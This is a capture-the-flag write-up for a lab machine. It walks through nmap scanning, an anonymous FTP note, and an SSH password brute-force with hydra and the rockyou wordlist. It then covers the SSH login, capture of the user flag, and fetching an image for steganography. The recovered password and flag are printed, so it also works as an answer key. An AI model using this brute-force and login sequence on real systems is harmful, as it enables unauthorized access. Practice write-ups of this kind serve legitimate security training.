# Target: 10.10.149.203

==========================

# At first let's do some inital scanning using namp.

    nmap -Pn -T4 10.10.149.203 -oA initial_scans
    PORT   STATE SERVICE
    21/tcp open  ftp
    22/tcp open  ssh
    80/tcp open  http

==========================

***Let's check out the service versions and along with it let's check out what's in port 80***

    nmap -Pn -p21,22,80 -A 10.10.149.203 -oA full_scan
    PORT   STATE SERVICE VERSION
    21/tcp open  ftp     vsftpd 3.0.3
    | ftp-syst: 
    |   STAT: 
    | FTP server status:
    |      Connected to ::ffff:10.18.14.129
    |      Logged in as ftp
    |      TYPE: ASCII
    |      No session bandwidth limit
    |      Session timeout in seconds is 300
    |      Control connection is plain text
    |      Data connections will be plain text
    |      At session startup, client count was 3
    |      vsFTPd 3.0.3 - secure, fast, stable
    |_End of status
    | ftp-anon: Anonymous FTP login allowed (FTP code 230)
    |_-rw-r--r--    1 0        0             119 May 17  2020 note_to_jake.txt
    22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
    80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
    |_http-server-header: Apache/2.4.29 (Ubuntu)
    |_http-title: Site doesn't have a title (text/html).
    Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

==========================

***Let's check out ftp's note_to_jake.txt file***

# Contents of the file:
    From Amy,

    Jake please change your password. It is too weak and holt will be mad if someone hacks into the nine nine

==========================

***Let's try to brute force the user jake with hydra***

    hydra -l jake -P /usr/share/wordlists/rockyou.txt 10.10.149.203 -t 4 ssh
    [22][ssh] host: 10.10.149.203   login: jake   password: 987654321

**Got the login detail of jake**
    
    user: jake password: 987654321

# let's log in using ssh
    ssh jake@10.10.149.203
    The authenticity of host '10.10.149.203 (10.10.149.203)' can't be established.
    ED25519 key fingerprint is SHA256:ceqkN71gGrXeq+J5/dquPWgcPWwTmP2mBdFS2ODPZZU.
    This key is not known by any other names.
    Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
    Warning: Permanently added '10.10.149.203' (ED25519) to the list of known hosts.
    jake@10.10.149.203's password: 
    Last login: Tue May 26 08:56:58 2020
    jake@brookly_nine_nine:~$ ls
    jake@brookly_nine_nine:~$ id                                                   
    uid=1000(jake) gid=1000(jake) groups=1000(jake)

==========================

***Now let's try to get the user flag***

    jake@brookly_nine_nine:~$ find / -type f -name user.txt 2>/dev/null                                                                                
    /home/holt/user.txt
    jake@brookly_nine_nine:~$ cat /home/holt/user.txt                                                                                                  
    ee11cbb19052e40b07aac0ca060c23ee
    jake@brookly_nine_nine:~$

And we got it: **ee11cbb19052e40b07aac0ca060c23ee**
**Found some hint in the source code of the site:**

    <!-- Have you ever heard of steganography? -->

***Let's try to get the image and look for something in the image***

    wget http://10.10.149.203/brooklyn99.jpg